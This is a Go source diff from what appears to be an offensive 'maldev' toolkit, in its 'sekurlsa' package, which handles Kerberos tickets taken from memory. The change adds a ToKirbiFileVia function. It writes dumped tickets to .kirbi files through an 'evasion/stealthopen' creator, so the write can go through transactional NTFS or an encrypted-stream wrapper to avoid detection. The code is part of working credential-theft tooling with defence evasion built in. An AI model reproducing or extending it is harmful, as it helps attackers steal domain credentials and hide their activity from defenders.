@@ -3,7 +3,6 @@ package sekurlsa
 import (
 	"errors"
 	"fmt"
-	"os"
 	"path/filepath"
 	"regexp"
 	"strings"
@@ -11,6 +10,7 @@ import (
 
 	"github.com/jcmturner/gofork/encoding/asn1"
 
+	"github.com/oioio-space/maldev/evasion/stealthopen"
 	"github.com/oioio-space/maldev/internal/krb5/iana/msgtype"
 	"github.com/oioio-space/maldev/internal/krb5/iana/nametype"
 	"github.com/oioio-space/maldev/internal/krb5/messages"
@@ -125,15 +125,31 @@ func (t *KerberosTicket) ToKirbi() ([]byte, error) {
 // `[krbtgt|TGS]-CLIENT@DOMAIN_to_SERVICE@DOMAIN.kirbi` shape but
 // sanitized so it lands cleanly on every filesystem (no '/', '\',
 // ':' — replaced with '_'). When dir is empty the file lands in the
-// current working directory.
+// current working directory. Equivalent to [KerberosTicket.ToKirbiFileVia]
+// with a nil Creator.
 func (t *KerberosTicket) ToKirbiFile(dir string) (string, error) {
+	return t.ToKirbiFileVia(nil, dir)
+}
+
+// ToKirbiFileVia routes the .kirbi write through the operator-supplied
+// [stealthopen.Creator]. nil falls back to a [stealthopen.StandardCreator]
+// (plain os.Create) — same byte content as [KerberosTicket.ToKirbiFile].
+// Use a non-nil Creator to land the ticket through transactional NTFS,
+// an encrypted-stream wrapper, or any other operator-controlled write
+// primitive.
+func (t *KerberosTicket) ToKirbiFileVia(creator stealthopen.Creator, dir string) (string, error) {
 	data, err := t.ToKirbi()
 	if err != nil {
 		return "", err
 	}
 	name := kirbiFilename(t)
 	path := filepath.Join(dir, name)
-	if err := os.WriteFile(path, data, 0600); err != nil {
+	wc, err := stealthopen.UseCreator(creator).Create(path)
+	if err != nil {
+		return "", fmt.Errorf("create %s: %w", path, err)
+	}
+	defer wc.Close()
+	if _, err := wc.Write(data); err != nil {
 		return "", fmt.Errorf("write %s: %w", path, err)
 	}
 	return path, nil
